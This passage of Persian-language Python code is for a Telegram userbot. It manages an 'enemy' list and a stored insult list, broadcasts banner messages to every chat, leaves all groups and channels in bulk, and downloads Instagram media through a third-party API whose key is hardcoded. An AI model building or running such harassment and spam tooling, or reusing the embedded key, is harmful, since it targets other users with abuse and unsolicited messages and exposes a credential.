            replies_list = "\n".join([f"• **{trigger}** → {reply}" for trigger, reply in auto_replies.items()])
            await message.edit(f"📝 **لیست پاسخ‌های خودکار**\n\n{replies_list}\n\n**تعداد:** {len(auto_replies)}")

@app.on_message(filters.me & filters.command("دشمن", prefixes=""))
async def enemy_command(client: Client, message: Message):
    if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کن**")
    enemy_user = message.reply_to_message.from_user
    enemy_id = enemy_user.id
    if is_enemy(enemy_id): await message.edit(f"❌ **این کاربر از قبل دشمن است**")
    else:
        enemies.add(enemy_id); save_enemies(enemies)
        await message.edit(f"**کاربر مورد نظر به لیست دشمن ها اضافه شد 😈**")

@app.on_message(filters.me & filters.command("فحش", prefixes=""))
async def insult_command(client: Client, message: Message):
    if len(message.command) < 2: return await message.edit("⚠️ **سیستم مدیریت فحش‌ها**\n\n• `فحش افزودن [متن]`\n• `فحش حذف [متن]`\n• `لیست فحش`")
    sub_command = message.command[1]
    if sub_command == "افزودن":
        if len(message.command) < 3: return await message.edit("❌ **لطفا متن فحش را وارد کنید**")
        insult_text = ' '.join(message.command[2:]).strip()
        insults_list = load_insults()
        if insult_text not in insults_list:
            insults_list.append(insult_text)
            if save_insults(insults_list): await message.edit(f"✅ **فحش افزوده شد**")
            else: await message.edit("❌ **خطا در ذخیره فحش**")
        else: await message.edit(f"❌ **این فحش از قبل وجود دارد**")
    elif sub_command == "حذف":
        if len(message.command) < 3: return await message.edit("❌ **لطفا متن فحش را وارد کنید**")
        insult_text = ' '.join(message.command[2:]).strip()
        insults_list = load_insults()
        if insult_text in insults_list:
            insults_list.remove(insult_text)
            if save_insults(insults_list): await message.edit(f"✅ **فحش حذف شد**")
            else: await message.edit("❌ **خطا در حذف فحش**")
        else: await message.edit(f"❌ **این فحش یافت نشد**")

@app.on_message(filters.me & filters.command("حذف", prefixes=""))
async def remove_enemy_command(client: Client, message: Message):
    if message.text.strip() == "حذف دشمن":
        if not message.reply_to_message: return await message.edit("❌ باید روی پیام دشمن ریپلای کنی")
        user_id = message.reply_to_message.from_user.id
        if user_id in enemies:
            enemies.remove(user_id); save_enemies(enemies)
            return await message.edit("✅ کاربر با موفقیت از لیست دشمن حذف شد")
        else: return await message.edit("⚠️ این کاربر داخل لیست دشمن نیست")

@app.on_message(filters.me & filters.command("لیست دشمن", prefixes=""))
async def enemy_list_command(client: Client, message: Message):
    if not enemies: return await message.edit("❌ **لیست دشمنان خالی است**")
    try:
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات دشمنان...**")
        enemies_list = []
        for enemy_id in list(enemies):
            try:
                user = await client.get_users(enemy_id)
                full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                enemies_list.append({'id': enemy_id, 'name': full_name, 'username': f"@{user.username}" if user.username else "❌ ندارد"})
            except: enemies_list.append({'id': enemy_id, 'name': "❌ خطا", 'username': "❌ خطا"})
        list_text = f"👿 **لیست دشمنان - تعداد: {len(enemies_list)}**\n\n"
        for i, enemy in enumerate(enemies_list, 1):
            list_text += f"{i}. **نام:** {enemy['name']}\n   **آیدی:** `{enemy['id']}`\n   **یوزرنیم:** {enemy['username']}\n   " + "─" * 30 + "\n"
        await loading_msg.edit(list_text)
    except: pass

@app.on_message(filters.me & filters.command("دشمنان", prefixes=""))
async def enemies_compact_command(client: Client, message: Message):
    if not enemies: return await message.edit("❌ **لیست دشمنان خالی است**")
    try:
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات...**")
        compact_text = f"👿 **لیست دشمنان - تعداد: {len(enemies)}**\n\n"
        for i, enemy_id in enumerate(list(enemies), 1):
            try:
                user = await client.get_users(enemy_id)
                full_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "بدون نام"
                compact_text += f"{i}. **{full_name}** - {f'@{user.username}' if user.username else 'بدون یوزرنیم'} - `{enemy_id}`\n"
            except: compact_text += f"{i}. ❌ خطا - `{enemy_id}`\n"
        await loading_msg.edit(compact_text)
    except: pass

@app.on_message(filters.me & filters.command("پاک کردن دشمنان", prefixes=""))
async def clear_enemies_command(client: Client, message: Message):
    if not enemies: return await message.edit("❌ **لیست دشمنان از قبل خالی است**")
    enemy_count = len(enemies)
    enemies.clear(); save_enemies(enemies)
    await message.edit(f"✅ **تمام دشمنان پاک شدند**\n\n🗑 **تعداد حذف شده:** {enemy_count} نفر")

@app.on_message(filters.me & filters.command("ایدی", prefixes="") & filters.regex(r"^ایدی$"))
async def advanced_id_command(client: Client, message: Message):
    try:
        user = message.from_user; chat = message.chat
        premium_status = "<b>فعال</b>" if user.is_premium else "<i>غیرفعال</i>"
        username_id = f"@{user.username}" if user.username else "<i>ندارد</i>"
        profile_photos = await client.get_chat_photos_count(user.id)
        if message.reply_to_message:
            replied_user = message.reply_to_message.from_user; replied_chat = message.chat
            common_chats = await client.get_common_chats(replied_user.id)
            user_info = f"""
<b>• اطلاعات کاربر</b>
<b>آیدی عددی:</b> <code>{replied_user.id}</code>
<b>یوزرنیم:</b> <code>{username_id}</code>
<b>نام:</b> {replied_user.first_name or '<i>ندارد</i>'}
<b>پریمیوم:</b> {"<b>فعال</b>" if replied_user.is_premium else "<i>غیرفعال</i>"}
<b>تعداد پروفایل:</b> {await client.get_chat_photos_count(replied_user.id)}
<b>• اطلاعات چت</b>
<b>آیدی چت:</b> <code>{replied_chat.id}</code>
<b>عنوان چت:</b> {replied_chat.title or '<i>ندارد</i>'}
<b>تعداد اعضا:</b> {replied_chat.members_count if hasattr(replied_chat, 'members_count') and replied_chat.members_count else '<i>نامشخص</i>'}"""
            if common_chats:
                user_info += f"\n<b>• گروه‌های مشترک:</b> {len(common_chats)}\n<blockquote>"
                for i, common_chat in enumerate(common_chats, 1):
                    chat_type = "گروه" if common_chat.type in ["group", "supergroup"] else "کانال" if common_chat.type == "channel" else "شخصی"
                    user_info += f"<b>{i}. {common_chat.title}</b>\n<i>نوع:</i> {chat_type}\n<i>یوزرنیم:</i> {f'@{common_chat.username}' if common_chat.username else 'بدون یوزرنیم'}\n<i>آیدی:</i> <code>{common_chat.id}</code>" + ("\n\n" if i < len(common_chats) else "")
                user_info += f"</blockquote>"
            else: user_info += f"\n<b>• گروه‌های مشترک:</b> <i>هیچ گروه مشترکی یافت نشد</i>"
            await message.edit_text(user_info, parse_mode=enums.ParseMode.HTML)
        else:
            chat_info = f"""
<b>• اطلاعات کاربر و چت</b>
<b>اطلاعات شما</b>
<b>آیدی عددی:</b> <code>{user.id}</code>
<b>یوزرنیم:</b> <code>{username_id}</code>
<b>نام:</b> {user.first_name or '<i>ندارد</i>'}
<b>پریمیوم:</b> {premium_status}
<b>تعداد پروفایل:</b> {profile_photos}
<b>اطلاعات چت فعلی</b>
<b>آیدی چت:</b> <code>{chat.id}</code>
<b>عنوان چت:</b> {chat.title or '<i>ندارد</i>'}
<b>تعداد اعضا:</b> {chat.members_count if hasattr(chat, 'members_count') and chat.members_count else '<i>نامشخص</i>'}"""
            await message.edit_text(chat_info, parse_mode=enums.ParseMode.HTML)
    except Exception as e: await message.edit_text(f"<b>خطا در دریافت اطلاعات:</b>\n<code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("دانلود", prefixes=""))
async def download_from_link(client: Client, message: Message):
    if len(message.command) < 2: return await message.edit_text("❌ **فرمت:**\n`دانلود https://t.me/channel/123`")
    link = message.command[1]
    try:
        pattern = r"https://t\.me/(.+)/(\d+)"; match = re.match(pattern, link)
        if not match: return await message.edit_text("❌ **لینک نامعتبر!**")
        username = match.group(1); post_id = int(match.group(2))
        processing_msg = await message.edit_text("🔍 **در حال دریافت پست...**")
        post = await client.get_messages(username, post_id)
        if not post: return await processing_msg.edit_text("❌ **پست یافت نشد**")
        await processing_msg.edit_text("📥 **در حال کپی کردن پست...**")
        try:
            await post.copy("me")
            await processing_msg.edit_text("✅ **پست با موفقیت در پیام‌های ذخیره شده کپی شد**")
        except:
            try:
                if post.media:
                    file_path = await post.download()
                    if post.audio: await client.send_audio("me", file_path, caption=post.caption or "")
                    elif post.video: await client.send_video("me", file_path, caption=post.caption or "")
                    elif post.photo: await client.send_photo("me", file_path, caption=post.caption or "")
                    elif post.document: await client.send_document("me", file_path, caption=post.caption or "")
                    elif post.voice: await client.send_voice("me", file_path, caption=post.caption or "")
                    elif post.sticker: await client.send_sticker("me", file_path)
                    elif post.animation: await client.send_animation("me", file_path, caption=post.caption or "")
                    elif post.video_note: await client.send_video_note("me", file_path)
                    else: await client.send_document("me", file_path, caption=post.caption or "")
                    os.remove(file_path)
                if post.text: await client.send_message("me", post.text)
                await processing_msg.edit_text("✅ **محتوا با موفقیت ارسال شد**")
            except Exception as download_error: await processing_msg.edit_text(f"❌ **خطا:** `{str(download_error)}`")
    except Exception as e: await message.edit_text(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^آنلاین (روشن|خاموش)$'))
async def online_command(client, message):
    global always_online_enabled
    action = message.matches[0].group(1)
    if action == "روشن":
        always_online_enabled = True
        await message.edit_text("✅ **حالت همیشه آنلاین فعال شد**")
        asyncio.create_task(keep_online(client))
    elif action == "خاموش":
        always_online_enabled = False
        await message.edit_text("❌ **حالت همیشه آنلاین غیرفعال شد**")

@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه روشن$"))
async def lock_all_on_command(client, message): lock_settings["همه"] = True; await message.edit("✅ **قفل همه فعال شد**")
@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه خاموش$"))
async def lock_all_off_command(client, message): lock_settings["همه"] = False; await message.edit("✅ **قفل همه غیرفعال شد**")
@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا روشن$"))
async def lock_media_on_command(client, message): lock_settings["مدیا"] = True; await message.edit("✅ **قفل مدیا فعال شد**")
@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا خاموش$"))
async def lock_media_off_command(client, message): lock_settings["مدیا"] = False; await message.edit("✅ **قفل مدیا غیرفعال شد**")
@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر روشن$"))
async def lock_sticker_on_command(client, message): lock_settings["استیکر"] = True; await message.edit("✅ **قفل استیکر فعال شد**")
@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر خاموش$"))
async def lock_sticker_off_command(client, message): lock_settings["استیکر"] = False; await message.edit("✅ **قفل استیکر غیرفعال شد**")
@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد روشن$"))
async def lock_forward_on_command(client, message): lock_settings["فوروارد"] = True; await message.edit("✅ **قفل فوروارد فعال شد**")
@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد خاموش$"))
async def lock_forward_off_command(client, message): lock_settings["فوروارد"] = False; await message.edit("✅ **قفل فوروارد غیرفعال شد**")
@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس روشن$"))
async def lock_voice_on_command(client, message): lock_settings["ویس"] = True; await message.edit("✅ **قفل ویس فعال شد**")
@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس خاموش$"))
async def lock_voice_off_command(client, message): lock_settings["ویس"] = False; await message.edit("✅ **قفل ویس غیرفعال شد**")
@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام روشن$"))
async def lock_text_on_command(client, message): lock_settings["پیام"] = True; await message.edit("✅ **قفل پیام فعال شد**")
@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام خاموش$"))
async def lock_text_off_command(client, message): lock_settings["پیام"] = False; await message.edit("✅ **قفل پیام غیرفعال شد**")
@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل روشن$"))
async def lock_file_on_command(client, message): lock_settings["فایل"] = True; await message.edit("✅ **قفل فایل فعال شد**")
@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل خاموش$"))
async def lock_file_off_command(client, message): lock_settings["فایل"] = False; await message.edit("✅ **قفل فایل غیرفعال شد**")

@app.on_message(filters.me & filters.command("وضعیت قفل", prefixes="") & filters.regex(r"^وضعیت قفل$"))
async def lock_status_command(client, message):
    status_text = "🔒 **وضعیت قفل‌های پیوی**\n\n"
    for lock_type, status in lock_settings.items():
        status_text += f"{'🔴' if status else '🟢'} **{lock_type}**: {'قفل' if status else 'آزاد'}\n"
    await message.edit(status_text)

@app.on_message(filters.me & filters.command("ریست قفل", prefixes="") & filters.regex(r"^ریست قفل$"))
async def reset_lock_command(client, message):
    for key in lock_settings: lock_settings[key] = False
    await message.edit("✅ **همه قفل‌ها ریست شدند**")

@app.on_message(filters.me & filters.command("راهنمای قفل", prefixes="") & filters.regex(r"^راهنمای قفل$"))
async def lock_help_command(client, message):
    await message.edit("🛡️✨ **مرکز کنترل قفل‌های پیوی**\n\n• `همه روشن` ➜ فعال‌سازی کامل قفل‌ها\n• `همه خاموش` ➜ آزادسازی کامل\n• `مدیا روشن/خاموش` ➜ بستن عکس و ویدیو\n• `استیکر روشن/خاموش` ➜ قفل استیکر و گیف\n• `فوروارد روشن/خاموش` ➜ جلوگیری از فوروارد\n• `پیام روشن/خاموش` ➜ قفل پیام‌های متنی\n• `ویس روشن/خاموش` ➜ قفل ویس\n• `فایل روشن/خاموش` ➜ قفل فایل‌ها\n• `وضعیت قفل` ➜ نمایش وضعیت فعلی\n• `ریست قفل` ➜ بازگردانی به حالت اولیه")

@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین روشن$"))
async def enable_anti_login(client, message):
    global anti_login_enabled; anti_login_enabled = True
    await message.edit("✅ **انتی لاگین فعال شد**")
@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین خاموش$"))
async def disable_anti_login(client, message):
    global anti_login_enabled; anti_login_enabled = False
    await message.edit("✅ **انتی لاگین غیرفعال شد**")
@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین$"))
async def check_anti_login(client, message):
    global anti_login_enabled
    status = "فعال ✅" if anti_login_enabled else "غیرفعال ❌"
    await message.edit(f"🛡️ **وضعیت انتی لاگین:** {status}")

@app.on_message(filters.me & filters.regex(r'^ریکت\s+(.+)$'))
async def set_reaction_command(client, message):
    if len(message.command) < 2: return await message.edit("✨ **سیستم ریکشن خودکار**\n\n📌 **استفاده:**\n• `ریکت 😊` (ریپلای روی پیام کاربر)")
    reaction_emoji = message.command[1]
    if message.reply_to_message and message.reply_to_message.from_user:
        user_id = message.reply_to_message.from_user.id
        auto_reactions[str(user_id)] = reaction_emoji; save_reactions()
        await message.edit(f"✅ **ریکشن ثبت شد**\n🎭 **ریکشن:** {reaction_emoji}")
        return
    await message.edit("❌ **روی پیام کاربر ریپلای کنید**")

@app.on_message(filters.me & filters.regex(r'^لیست ریکت$'))
async def list_reactions_command(client, message):
    if not auto_reactions: return await message.edit("❌ **هیچ ریکشنی ثبت نشده**")
    list_text = "📜 **لیست ریکشن‌های خودکار**\n\n"
    for user_id, reaction in auto_reactions.items():
        try:
            user = await client.get_users(int(user_id))
            list_text += f"👤 **{user.first_name or 'نامشخص'}**\n🆔 `{user_id}` → {reaction}\n" + "─" * 30 + "\n"
        except: pass
    await message.edit(list_text)

@app.on_message(filters.me & filters.regex(r'^پاکسازی ریکت$'))
async def clear_reactions_command(client, message):
    if not auto_reactions: return await message.edit("❌ **هیچ ریکشنی برای پاکسازی وجود ندارد**")
    reaction_count = len(auto_reactions)
    auto_reactions.clear(); save_reactions()
    await message.edit(f"✅ **لیست ریکشن‌ها پاکسازی شد**\n\n🗑️ **تعداد حذف شده:** {reaction_count} ریکشن")

@app.on_message(filters.me & filters.command("لیست فحش", prefixes=""))
async def insult_list_command(client: Client, message: Message):
    insults_list = load_insults()
    if not insults_list: return await message.edit("❌ **لیست فحش‌ها خالی است**")
    try:
        loading_msg = await message.edit("🔄 **در حال دریافت لیست فحش‌ها...**")
        list_text = f"💢 **لیست فحش‌ها - تعداد: {len(insults_list)}**\n\n"
        for i, insult in enumerate(insults_list, 1): list_text += f"{i}. {insult}\n"
        await loading_msg.edit(list_text)
    except: pass

@app.on_message(filters.me & filters.command("ویرایش", prefixes="") & filters.regex(r"^ویرایش .+ به .+$"))
async def quick_edit_command(client: Client, message: Message):
    try:
        if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیامی که می‌خواهید ویرایش کنید ریپلای کنید**")
        command_parts = message.text.split()
        if len(command_parts) != 4: return await message.edit("❌ **فرمت نادرست!**\n`ویرایش کلمه_قدیمی به کلمه_جدید`")
        old_word = command_parts[1]; separator = command_parts[2]; new_word = command_parts[3]
        if separator != "به": return await message.edit("❌ **از کلمه 'به' به عنوان جداکننده استفاده کنید**")
        replied_message = message.reply_to_message; old_text = replied_message.text or replied_message.caption or ""
        if old_word not in old_text: return await message.edit(f"❌ **کلمه '{old_word}' در پیام یافت نشد**")
        new_text = old_text.replace(old_word, new_word)
        await client.edit_message_text(chat_id=replied_message.chat.id, message_id=replied_message.id, text=new_text)
        await message.delete()
    except: pass

@app.on_message(filters.me & filters.command("تنظیم بنر", prefixes="") & filters.regex(r"^تنظیم بنر$"))
async def set_banner_command(client: Client, message: Message):
    global banner_counter
    try:
        if not message.reply_to_message: return await message.edit("❌ **لطفا روی پیامی که می‌خواهید به عنوان بنر ثبت کنید ریپلای کنید**")
        replied_message = message.reply_to_message; banner_id = banner_counter; banner_counter += 1
        banners[banner_id] = {'message': replied_message, 'text': replied_message.text or replied_message.caption or "", 'media': replied_message.media, 'created_at': datetime.now()}
        await message.edit(f"✅ **بنر با موفقیت ثبت شد**\n\n🆔 **کد بنر:** `{banner_id}`")
    except: pass

@app.on_message(filters.me & filters.command("بنر همگانی", prefixes="") & filters.regex(r"^بنر همگانی \d+$"))
async def start_broadcast_command(client: Client, message: Message):
    try:
        banner_id = int(message.command[1])
        if banner_id not in banners: return await message.edit("❌ **کد بنر یافت نشد**")
        active_broadcasts['global'] = {'banner_id': banner_id, 'running': True, 'start_time': datetime.now()}
        await message.edit("✅ **بنر همگانی فعال شد**")
        asyncio.create_task(send_global_banner(client, banner_id))
    except: pass

@app.on_message(filters.me & filters.command("لیست بنرها", prefixes="") & filters.regex(r"^لیست بنرها$"))
async def list_banners_command(client: Client, message: Message):
    try:
        if not banners: return await message.edit("❌ **هیچ بنری ثبت نشده است**")
        list_text = "📋 **لیست بنرها**\n\n"
        for banner_id, banner_data in banners.items():
            created_time = banner_data['created_at'].strftime("%Y-%m-%d %H:%M")
            preview = banner_data['text'][:50] + "..." if len(banner_data['text']) > 50 else banner_data['text']
            list_text += f"🆔 **کد:** `{banner_id}`\n📝 **پیش‌نمایش:** {preview}\n⏰ **زمان ثبت:** {created_time}\n" + "─" * 30 + "\n"
        await message.edit(list_text)
    except: pass

@app.on_message(filters.me & filters.command("بنر همگانی خاموش", prefixes="") & filters.regex(r"^بنر همگانی خاموش$"))
async def stop_broadcast_command(client: Client, message: Message):
    try:
        if 'global' in active_broadcasts: active_broadcasts['global']['running'] = False; await message.edit("✅ **بنر همگانی خاموش شد**")
        else: await message.edit("❌ **بنر همگانی فعال نیست**")
    except: pass

@app.on_message(filters.me & filters.command("بنر ارسال", prefixes="") & filters.regex(r"^بنر ارسال \d+$"))
async def instant_broadcast_command(client: Client, message: Message):
    try:
        banner_id = int(message.command[1])
        if banner_id not in banners: return await message.edit("❌ **کد بنر یافت نشد**")
        await message.edit("🔄 **شروع ارسال فوری بنر...**")
        asyncio.create_task(send_instant_broadcast(client, banner_id))
    except: pass

@app.on_message(filters.me & filters.command("زمان بنر", prefixes="") & filters.regex(r"^زمان بنر \d+$"))
async def set_banner_time_command(client: Client, message: Message):
    try:
        minutes = int(message.command[1]); active_broadcasts['delay'] = minutes * 60
        await message.edit(f"✅ **زمان بنر تنظیم شد:** {minutes} دقیقه")
    except: pass

@app.on_message(filters.me & filters.command("فرمت", prefixes=""))
async def format_command(client, message):
    if len(message.command) < 2:
        status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
        for format_name, is_active in format_settings.items():
            status_text += f"{'🟢' if is_active else '🔴'} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
        await message.edit(f"{status_text}\n📝 <b>دستورات فرمت:</b>\n<code>فرمت [نام] روشن/خاموش</code>\n\n🔧 <b>سایر دستورات:</b>\n<code>فرمت وضعیت</code>\n<code>فرمت ریست</code>", parse_mode=enums.ParseMode.HTML)
        return
    if len(message.command) == 2:
        sub_command = message.command[1]
        if sub_command == "وضعیت":
            status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
            for format_name, is_active in format_settings.items(): status_text += f"{'🟢' if is_active else '🔴'} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
            await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
        elif sub_command == "ریست":
            for format_name in format_settings: format_settings[format_name] = False
            await message.edit("✅ <b>همه فرمت‌ها غیرفعال شدند</b>", parse_mode=enums.ParseMode.HTML)
    if len(message.command) == 3:
        format_name = message.command[1]; action = message.command[2]
        if format_name in format_settings:
            if action == "روشن":
                format_settings[format_name] = True
                await message.edit(f"✅ <b>فرمت {format_name} فعال شد</b>", parse_mode=enums.ParseMode.HTML)
            elif action == "خاموش":
                format_settings[format_name] = False
                await message.edit(f"✅ <b>فرمت {format_name} غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("تعداد کانال ها", prefixes=""))
async def channels_count_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**📊 در حال شمارش کانال‌ها...**")
        channels_count = 0; channels_list = []
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL: channels_count += 1; channels_list.append(dialog.chat.title)
        result_text = f"**📈 آمار کانال‌ها**\n\n📊 **تعداد کل کانال‌ها:** `{channels_count}`\n\n📋 **لیست کانال‌ها:**\n"
        for i, channel in enumerate(channels_list[:20], 1): result_text += f"{i}. {channel}\n"
        await loading_msg.edit(result_text)
    except: pass

@app.on_message(filters.me & filters.command("تعداد گروه ها", prefixes=""))
async def groups_count_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**📊 در حال شمارش گروه‌ها...**")
        groups_count = 0; supergroups_count = 0; groups_list = []
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.GROUP: groups_count += 1; groups_list.append(f"👤 {dialog.chat.title}")
            elif dialog.chat.type == enums.ChatType.SUPERGROUP: supergroups_count += 1; groups_list.append(f"👑 {dialog.chat.title}")
        total_groups = groups_count + supergroups_count
        result_text = f"**📈 آمار گروه‌ها**\n\n📊 **تعداد کل گروه‌ها:** `{total_groups}`\n\n📋 **لیست گروه‌ها:**\n"
        for i, group in enumerate(groups_list[:20], 1): result_text += f"{i}. {group}\n"
        await loading_msg.edit(result_text)
    except: pass

@app.on_message(filters.me & filters.command("خروج همه کانال", prefixes=""))
async def leave_all_channels_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**🔄 در حال دریافت لیست کانال‌ها...**")
        channels = []
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL: channels.append(dialog.chat)
        if not channels: return await loading_msg.edit("**❌ هیچ کانالی برای خروج پیدا نشد**")
        await loading_msg.edit(f"**🚪 در حال خروج از {len(channels)} کانال...**")
        success_count = 0; failed_count = 0
        for i, channel in enumerate(channels, 1):
            try: await client.leave_chat(channel.id); success_count += 1; await asyncio.sleep(4)
            except: failed_count += 1
        await loading_msg.edit(f"**✅ عملیات خروج کامل شد**\n\n📊 **نتایج:**\n• ✅ موفق: `{success_count}`\n• ❌ ناموفق: `{failed_count}`")
    except: pass

@app.on_message(filters.me & filters.command("خروج همه گروه", prefixes=""))
async def leave_all_groups_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**🔄 در حال دریافت لیست گروه‌ها...**")
        groups = []
        async for dialog in client.get_dialogs():
            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]: groups.append(dialog.chat)
        if not groups: return await loading_msg.edit("**❌ هیچ گروهی برای خروج پیدا نشد**")
        await loading_msg.edit(f"**🚪 در حال خروج از {len(groups)} گروه...**")
        success_count = 0; failed_count = 0
        for i, group in enumerate(groups, 1):
            try: await client.leave_chat(group.id); success_count += 1; await asyncio.sleep(4)
            except: failed_count += 1
        await loading_msg.edit(f"**✅ عملیات خروج کامل شد**\n\n📊 **نتایج:**\n• ✅ موفق: `{success_count}`\n• ❌ ناموفق: `{failed_count}`")
    except: pass

@app.on_message(filters.me & filters.command("اکشن", prefixes=""))
async def action_command(client: Client, message: Message):
    if len(message.command) == 1:
        active_actions = [name for name, status in action_settings.items() if status]
        actions_text = """🎭 <b>سیستم اکشن خودکار</b>
📊 <b>وضعیت فعلی:</b>
"""
        if active_actions: actions_text += f"✅ <b>فعال:</b> {', '.join([get_persian_action_name(name) for name in active_actions])}\n"
        else: actions_text += "❌ <b>هیچ اکشنی فعال نیست</b>\n"
        actions_text += "\n🔧 <b>دستورات:</b>\n<code>اکشن لیست</code>\n<code>اکشن [نام] روشن</code>\n<code>اکشن [نام] خاموش</code>"
        await message.edit(actions_text, parse_mode=enums.ParseMode.HTML)
        return
    sub_command = message.command[1]
    if sub_command == "لیست":
        await message.edit("🎭 <b>لیست کامل اکشن‌های تلگرام</b>\n\n• تایپ\n• اپلود عکس\n• ضبط ویس\n• اپلود ویدیو\n• اپلود فایل\n• ضبط ویدیو\n• بازی\n• انتخاب استیکر", parse_mode=enums.ParseMode.HTML)
    elif sub_command == "وضعیت":
        status_text = "📊 <b>وضعیت دقیق اکشن‌ها</b>\n\n"
        for action_name, is_active in action_settings.items(): status_text += f"{'🟢' if is_active else '🔴'} <b>{get_persian_action_name(action_name)}</b>: {'فعال ✅' if is_active else 'غیرفعال ❌'}\n"
        await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
    elif sub_command == "ریست":
        for key in action_settings: action_settings[key] = False
        await message.edit("✅ <b>همه اکشن‌ها خاموش شدند</b>", parse_mode=enums.ParseMode.HTML)
    else:
        full_text = ' '.join(message.command[1:])
        if " روشن" in full_text: action_name_persian = full_text.replace(" روشن", "").strip(); action_state = "روشن"
        elif " خاموش" in full_text: action_name_persian = full_text.replace(" خاموش", "").strip(); action_state = "خاموش"
        else: return await message.edit("❌ <b>فرمت دستور نادرست است</b>", parse_mode=enums.ParseMode.HTML)
        action_name = get_english_action_name(action_name_persian)
        if action_name not in action_settings: return await message.edit(f"❌ <b>اکشن '{action_name_persian}' یافت نشد</b>", parse_mode=enums.ParseMode.HTML)
        if action_state == "روشن": action_settings[action_name] = True; await message.edit(f"✅ <b>اکشن '{action_name_persian}' فعال شد</b>", parse_mode=enums.ParseMode.HTML)
        elif action_state == "خاموش": action_settings[action_name] = False; await message.edit(f"✅ <b>اکشن '{action_name_persian}' غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("اینستا", prefixes=""))
async def instagram_download_command(client: Client, message: Message):
    try:
        if len(message.command) < 2: return await message.edit("📥 **دستور دانلود اینستاگرام**\n\n📝 **استفاده:**\n`اینستا [لینک پست یا ریل]`")
        url = message.command[1].strip()
        if not url.startswith(("https://www.instagram.com/", "https://instagram.com/")): return await message.edit("❌ **لینک نامعتبر!**")
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات از اینستاگرام...**")
        api_key = "8000978149:uJC3mxBncq9ELPN@Api_ManagerRoBOT"
        encoded_url = urllib.parse.quote(url, safe='')
        final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"
        response = requests.get(final_api_url, timeout=45)
        if response.status_code != 200: return await loading_msg.edit(f"❌ **خطا در اتصال به سرور**")
        data = response.json()
        if not data.get("ok", False): return await loading_msg.edit("❌ **خطا از سمت API**")
        result = data.get("result", {})
        if result.get("status") != "success": return await loading_msg.edit("❌ **خطا در دریافت پست**")
        posts = result.get("result", [])
        if not posts: return await loading_msg.edit("❌ **هیچ محتوایی در این پست یافت نشد**")
        post = posts[0]
        post_id = post.get('id', 'نامشخص'); username = post.get('username', 'نامشخص'); caption = post.get('caption', 'بدون توضیح'); is_video = post.get('is_video', False); thumbnail_url = post.get('video_img', '')
        caption_text = f"📸 **اینستاگرام دانلودر**\n\n👤 **صاحب پست:** @{username}\n🆔 **آیدی پست:** `{post_id}`\n\n📝 **توضیحات:**\n{caption[:500]}"
        thumbnail_path = None
        if thumbnail_url:
            try:
                thumb_response = requests.get(thumbnail_url, timeout=15)
                if thumb_response.status_code == 200:
                    thumbnail_path = f"temp_thumb_{post_id}.jpg"
                    with open(thumbnail_path, 'wb') as f: f.write(thumb_response.content)
            except: pass
        if is_video:
            video_url = post.get('video_url')
            if not video_url: return await loading_msg.edit("❌ **لینک ویدیو یافت نشد**")
            await loading_msg.edit("🎥 **در حال دانلود ویدیو...**")
            try:
                video_response = requests.get(video_url, timeout=60)
                if video_response.status_code != 200: return await loading_msg.edit("❌ **خطا در دانلود ویدیو**")
                temp_file = f"temp_insta_{post_id}.mp4"
                with open(temp_file, 'wb') as f: f.write(video_response.content)
                await loading_msg.edit("📤 **در حال آپلود ویدیو...**")
                try: await client.send_video(chat_id=message.chat.id, video=temp_file, caption=caption_text, thumb=thumbnail_path if thumbnail_path else None, supports_streaming=True, reply_to_message_id=message.id)
                except: pass
                if os.path.exists(temp_file): os.remove(temp_file)
                if thumbnail_path and os.path.exists(thumbnail_path): os.remove(thumbnail_path)
                await loading_msg.delete()
            except: pass
        else:
